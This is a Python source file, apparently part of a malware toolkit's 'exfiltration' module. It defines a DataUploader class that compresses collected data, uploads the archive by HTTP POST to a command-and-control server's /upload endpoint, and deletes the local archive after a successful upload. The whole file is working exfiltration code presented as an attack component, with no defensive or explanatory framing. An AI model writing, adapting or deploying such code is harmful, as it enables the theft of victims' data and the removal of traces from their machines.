import requests
import json
from pathlib import Path
import time
import os
from modules.exfiltration.compression import compress_data

class DataUploader:
    def __init__(self, c2_server):
        self.c2_server = c2_server
        self.data_dir = Path('data/')
        
    def upload_data(self):
        """Compress and upload collected data"""
        try:
            # Compress data
            archive_path = compress_data()
            
            # Upload to C2
            with open(archive_path, 'rb') as f:
                files = {'file': (archive_path.name, f)}
                response = requests.post(f"{self.c2_server}/upload", files=files)
                
            if response.status_code == 200:
                # Clean up after successful upload
                os.remove(archive_path)
                print("Data uploaded successfully")
            else:
                print(f"Upload failed: {response.status_code}")
                
        except Exception as e:
            print(f"Upload error: {e}")